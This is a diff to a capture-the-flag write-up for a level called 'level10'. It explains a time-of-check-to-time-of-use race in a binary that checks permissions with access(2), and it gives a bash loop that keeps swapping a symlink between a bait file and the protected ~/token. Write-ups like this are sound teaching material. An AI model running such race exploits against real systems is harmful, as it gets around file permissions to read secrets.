@@ -1,11 +1,13 @@
 # level10
 
-`./level10` uses `access(2)` -> we can create a file we have permition to access & quickly replace it to a symlink to `~/token`
+The executable `~/level10` can read `~/token` (we can't), but it won't let us because it uses `access(2)` to check if we have permission.
 
-Three separate jobs are needed here:
+`access(2)` is flawed -> we can create a file we have permition to access & quickly replace it to a symlink to `~/token`
+
+Three separate bash jobs are needed here:
 
 ```bash
-# Create a symlink and a bait
+# Switch between a symlink to ~/token and a bait
 touch /tmp/bait;
 while true; do ln -sf ~/token /tmp/lnk; ln -sf /tmp/bait /tmp/lnk; done
 ```
